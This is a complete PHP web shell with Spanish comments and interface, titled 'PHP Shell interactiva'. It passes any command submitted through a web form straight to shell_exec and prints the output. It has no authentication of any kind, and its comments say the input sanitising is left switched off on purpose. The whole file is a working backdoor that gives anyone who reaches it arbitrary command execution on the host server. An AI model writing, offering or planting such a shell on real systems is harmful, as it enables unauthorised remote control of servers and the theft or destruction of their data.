<?php
$output = '';
if (isset($_POST['cmd'])) {
	$cmd = $_POST['cmd'];
	// Ejecuta el comando y captura la salida
	// Usamos escapeshellcmd para evitar comandos peligrosos, pero si querés total libertad, quita esa línea
	// $cmd = escapeshellcmd($cmd);

	// Ejecutar y capturar salida y error
	$output = shell_exec($cmd . ' 2>&1');
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8" />
	<title>PHP Shell interactiva</title>
	<style>
    	body { font-family: monospace; background: #121212; color: #eee; }
    	textarea { width: 100%; height: 100px; background: #222; color: #eee; border: none; padding: 10px; font-family: monospace; font-size: 14px; }
    	pre { background: #111; padding: 10px; white-space: pre-wrap; word-wrap: break-word; }
    	form { margin-bottom: 10px; }
    	input[type=submit] { padding: 5px 15px; background: #333; color: #eee; border: none; cursor: pointer; }
    	input[type=submit]:hover { background: #555; }
	</style>
</head>
<body>
	<h1>PHP Shell interactiva</h1>
	<form method="post">
    	<label for="cmd">Escribí tu comando:</label><br/>
    	<textarea name="cmd" id="cmd" placeholder="Ej: ls -la /tmp"><?php if (isset($_POST['cmd'])) echo htmlspecialchars($_POST['cmd']); ?></textarea><br/>
    	<input type="submit" value="Ejecutar"/>
	</form>

	<h2>Salida:</h2>
	<pre><?php echo htmlspecialchars($output); ?></pre>
</body>
</html>
